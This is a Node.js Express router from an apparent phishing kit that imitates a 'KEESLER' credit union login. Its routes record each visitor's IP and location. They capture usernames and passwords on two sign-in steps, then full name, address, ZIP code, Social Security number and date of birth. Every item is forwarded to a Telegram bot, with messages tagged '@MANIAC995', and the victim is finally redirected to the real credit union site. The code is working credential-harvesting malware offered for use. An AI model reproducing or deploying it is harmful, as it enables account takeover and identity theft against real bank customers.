const express = require("express");
const router = express.Router();
const { Telegraf } = require("telegraf");
const axios = require("axios");
const config = require("../config");

const bot = new Telegraf(config.BOT_TOKEN);

async function getLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    console.error("IP lookup failed:", error.message);
    return null;
  }
}

router.get("/", async function (req, res, next) {
  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

  if (ip.startsWith("::ffff:")) {
    ip = ip.replace("::ffff:", "");
  }

  const location = await getLocation(ip);

  let locationText = "Location: Unknown";
  if (location && location.city && location.regionName) {
    locationText = `Location: ${location.city}, ${location.regionName}`;
  }

  const text = `🚨 A user has visited the KEESLER page!\n\nTime: ${new Date().toISOString()}\nIP: ${ip}\n${locationText}`;

  try {
    await bot.telegram.sendMessage(config.CHAT_ID, text);
    res.render("index");
  } catch (error) {
    console.error("Telegram API error:", error.response?.data || error.message);
    res.render("index");
  }
});

router.get("/signin/v1", function (req, res, next) {
  res.render("index", { title: "Express" });
});

router.post("/signin/v2", async (req, res, next) => {
  console.log(req.body);

 let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

if (ip.startsWith("::ffff:")) {
  ip = ip.replace("::ffff:", "");
}

const location = await getLocation(ip);

let locationText = "Unknown";
if (location && location.city && location.regionName) {
  locationText = `${location.city}, ${location.regionName}`;
}


  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW KEESLER 2025 LOG - @MANIAC995</b>\n\n<b>LOG ID:</b> <code>${
      req.body.id
    }</code>\n<b>USERNAME:</b> <code>${
      req.body.username
    }</code>\n<b>PASSWORD:</b> <code>${
      req.body.password
    }</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );

  res.render("v2", { id: req.body.id });
});

router.post("/signin/v3", async (req, res, next) => {
  console.log(req.body);
let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

if (ip.startsWith("::ffff:")) {
  ip = ip.replace("::ffff:", "");
}

const location = await getLocation(ip);

let locationText = "Unknown";
if (location && location.city && location.regionName) {
  locationText = `${location.city}, ${location.regionName}`;
}

  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>KEESLER LOG [EMAIL & PHONE - NUMBER ] - @MANIAC995</b>\n\n<b>LOG ID:</b> <code>${req.body.id}</code>\n<b>DOUBLE  USERNAME  LOGIN:</b> <code>${req.body.username}</code>\n<b>DOUBLE  PASSWORD LOGIN:</b> <code>${req.body.password}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );

  res.render("v3", { id: req.body.id });
});

router.post("/confirmed", async (req, res, next) => {
   let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

if (ip.startsWith("::ffff:")) {
  ip = ip.replace("::ffff:", "");
}

const location = await getLocation(ip);

let locationText = "Unknown";
if (location && location.city && location.regionName) {
  locationText = `${location.city}, ${location.regionName}`;
}

  
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>KEESLER LOG [PERSONAL INFORMATION] - @MANIAC995</b>\n\n<b>LOG ID:</b> <code>${req.body.id}</code>\n<b>FULL NAME:</b> <code>${req.body.fname}</code>\n<b>Address:</b> <code>${req.body.addy}</code>\n<b>Zip Code:</b> <code>${req.body.zip}</code>\n<b>Social Security Number:</b> <code>${req.body.ssn}</code>\n<b>Date of Birth:</b> <code>${req.body.dob}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );

  res.redirect("https://everywhere.kfcu.org/mobile/authentication");
});

module.exports = router;
